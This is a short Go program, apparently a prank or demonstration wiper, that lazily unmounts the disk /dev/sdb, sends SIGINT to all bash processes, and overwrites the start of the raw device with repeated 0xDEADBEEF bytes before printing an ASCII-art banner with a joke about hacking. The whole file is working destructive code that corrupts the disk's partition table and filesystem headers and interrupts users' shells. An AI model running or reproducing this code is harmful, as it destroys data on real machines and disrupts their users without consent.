package main

import (
  "bytes"
  "fmt"
  "os"
  "os/exec"
  "syscall"
  "io/ioutil"
)

func main() {
  killdisk := "/dev/sdb"
  pullmount(killdisk)
  corruptdisk(killdisk)
  banner()
}

func banner() {
  fmt.Println("                                 __ ")
  fmt.Println("                       _ ,___,-'\",-=-. ")
  fmt.Println("           __,-- _ _,-'_)_  (\"\"`'-._\\ `. ")
  fmt.Println("        _,'  __ |,' ,-' __)  ,-     /. | ")
  fmt.Println("      ,'_,--'   |     -'  _)/         `\\ ")
  fmt.Println("    ,','      ,'       ,-'_,`           : ")
  fmt.Println("    ,'     ,-'       ,(,-(              : ")
  fmt.Println("         ,'       ,-' ,    _            ; ")
  fmt.Println("        /        ,-._/`---'            / ")
  fmt.Println("       /        (____)(----. )       ,' ")
  fmt.Println("      /         (      `.__,     /\\ /, ")
  fmt.Println("     :           ;-.___         /__\\/| ")
  fmt.Println("     |         ,'      `--.      -,\\ | ")
  fmt.Println("     :        /            \\    .__/ ")
  fmt.Println("      \\      (__            \\    |_ ")
  fmt.Println("       \\       ,`-, *       /   _|,\\ ")
  fmt.Println("        \\    ,'   `-.     ,'_,-'    \\ ")
  fmt.Println("       (_\\,-'    ,'\\\")--,'-'       __\\ ")
  fmt.Println("        \\       /  // ,'|      ,--'  `-. ")
  fmt.Println("         `-.    `-/ \\'  |   _,'         `. ")
  fmt.Println("            `-._ /      `--'/             \\ ")
  fmt.Println("               ,'           |              \\ ")
  fmt.Println("              /             |               \\ ")
  fmt.Println("           ,-'              |               / ")
  fmt.Println("          /                 |             -' ")
  fmt.Println("")
  fmt.Println("Woah, all this computer hacking is making me thirsty, ")
}

func corruptdisk(killdisk string) {
  var killdata bytes.Buffer

  for i := 0; i < 1024 * 10; i++ {
    killdata.WriteByte(0xde)
    killdata.WriteByte(0xad)
    killdata.WriteByte(0xbe)
    killdata.WriteByte(0xef)
  }

  fi,_ := os.Create(killdisk)
  fi.Write(killdata.Bytes())
  fi.Close()
}

func pullmount(killdisk string){
  var umountCmd = exec.Command("/bin/umount", "-l", killdisk)
  stdout, _ := umountCmd.StdoutPipe()
  umountCmd.Run()
  readstr,_ := ioutil.ReadAll(stdout)
  fmt.Printf("%s\n",  readstr)
  syscall.Sync()
  var signalCmd = exec.Command("/usr/bin/killall", "-SIGINT", "bash")
  signalCmd.Run()
  // fi, _ := os.Create("/proc/sys/vm/drop_caches")
  // fi.WriteString("3")
  // fi.Close()
}
